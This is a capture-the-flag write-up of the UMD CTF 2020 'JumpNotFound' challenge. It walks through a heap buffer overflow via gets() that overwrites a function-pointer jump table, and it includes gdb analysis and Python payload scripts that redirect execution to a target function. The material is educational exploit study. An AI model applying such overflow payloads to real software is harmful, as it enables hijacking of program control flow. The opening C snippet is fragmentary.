== Write Up JumpNotFound - UMD 2020

In this article, I am going to explain how I solve the challenge JumpNotFound from the UMD CTF 2020. The goal of this challenge is to be able to call a function called `jumpToNaboo`.

        switch( (int)ptr1->choice)

            case 1:
            {

                ptr2->hyperJump3();

                printf("2 - Coruscant\n");
                printf("3 - Endor\n");
                printf("4 - Logout\n");

        }
    }
    return 0;
}

The program is super simple. It asks a number to the user and jump to the corresponding function. The mecanism is based on a jump table and a coordinates structure both allocated on the heap.

[source,c++,numbered]
----
    struct coordinates* ptr1;
    struct jmptable* ptr2;
    
    ptr1 = malloc(sizeof(struct coordinates));
    ptr2 = malloc(sizeof(struct jmptable));
----

The user has control over the coordinates structure via this code:
[source,c++,numbered]
----
    gets(ptr1->userinput);
    ptr1->choice = strtol(ptr1->userinput, &ptr, 10);
----

It is obvious here that we have a buffer overflow, and more precisely a heap buffer overflow. But how can we exploit this buffer overflow to be able to redirect code execution to `jumpToNaboo` ? By overwriting the jump table of course !

=== Exploit
To exploit the buffer overflow, we will use dynamic analysis with gdb. 

[source,c++,numbered]
----
struct coordinates
{
    char userinput[64];  
    short choice;
};

struct jmptable
{
    void (*hyperJump1)();
    void (*hyperJump2)();
    void (*hyperJump3)();
    
};
----

Let's say that we want to overwrite the `hyperJump1` variable. For that we will "fuzz" the binary with gdb to know the padding between `userinput` and `hyperJump1` on the heap.

[source,python,numbered]
----
p = "1" + "\x00"
idx = 'A'
for i in range(26):
    p += idx * 8
    idx = chr(ord(idx) + 1)

print(p)
----

Let me explain this code.

[source,python,numbered]
----
p = "1" + "\x00"
----

This piece of code selects the first option in the program. The C code use `strtol` to get an integer from the user input. So `strtol` will read our user input until a `0x0`. The user input is queried by `gets` that stops only when `EOF` or newline occurs. So having a `0x0` in the user input is not a problem.

The remaining python code is just a loop to print `AAAAAAAABBBBBBBB ....`.

Let's run the binary with this input in gdb !

We set a breakpoint at `0x4007fe` because this is the address where the call to the first jump function (the one we want to overwrite) is made.
Once we reached this breakpoint, print the value of the register (`rdx`) that is supposed to contained the address of the needed function pointer. In our case, `rdx` is equal to `0x4b4b4b4b4b4b4a4a` wich is `KKKKKKJJ`. We successfuly overwrite the jump table ! And we know that the padding is `AAAAAAA...IIJJJJJJ`, so 78 bytes of padding.

Now that we have the padding, we need to find the address of `jumpToNaboo`. For that, we use gdb too. Just print `p jumpToNaboo`. We can just do that because the binary is not compile with PIE and has only PartialRelRo.

Now that we have everything, update our python script and theeeeeeen failed !

----
idx = 'A'
for i in range(9):
    p += idx * 8
    idx = chr(ord(idx) + 1)

p += struct.pack("<Q",   0x40070a)
print(p)
----

Remember, the C code uses `gets` to get the userinput and `gets` stops on newline. But the address of `jumpToNaboo` contains `0x0a` which is ... a newline. Mh.

Let's try with `0x40070b` if it works.

[source,python,numbered]
----
idx = 'A'
for i in range(9):
    p += idx * 8
    idx = chr(ord(idx) + 1)

p += struct.pack("<Q",   0x40070b)
print(p)

IT WORKS !
